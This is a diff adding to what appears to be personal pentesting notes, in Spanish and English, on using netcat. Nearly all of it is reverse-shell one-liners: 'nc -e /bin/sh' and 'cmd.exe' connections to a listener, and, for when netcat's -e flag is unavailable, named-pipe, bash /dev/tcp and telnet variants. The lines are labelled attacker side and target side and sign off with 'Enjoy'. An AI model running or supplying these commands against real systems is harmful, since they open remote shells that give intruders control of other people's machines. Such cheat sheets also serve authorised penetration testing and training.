@@ -1364,10 +1364,27 @@ Notas utiles: https://github.com/nanis/Crypt-SSLeay
                           
 NETCAT
 
+Compilando Netcat:
+Flags options:     -t (telnet)  -e (gaping security hole)
+#
+
 #netcat -lpv 9999                         → escuchando en el puerto 9999
 #netcat -e /bin/sh 192.9.200.99 9999      →se conecta al listen abierto en el anterior comando abriendo una shell(LINUX)
 #netcat -e cmd.exe 192.9.200.99 9999      →se conecta al listen abierto y abre una terminal cmd.exe" WINDOWS
 #nc -n -X 5 -x 127.0.0.1:9050 <target_host> <target_port>  →Pasar el tráfico de nc a través de TOR
+
+If GAPING_SECURITY_HOLE is disabled, tenemos varias opciones:
+#nc -n -vv -l -p 666        							→(attacker side (192.9.200.10))
+#mknod backpipe p && nc 192.9.200.10 666 0<backpipe | /bin/bash 1>backpipe      →(target side)
+Enjoy....
+
+#nc -n -vv -l -p 666
+#/bin/bash -i > /dev/tcp/192.9.200.10/666 0<&1 2>&1 
+Enjoy
+
+#nc -n -vv -l -p 666
+#mknod backpipe p && telnet 192.9.200.10 666 0<backpipe | /bin/bash 1>backpipe
+
 
 
 
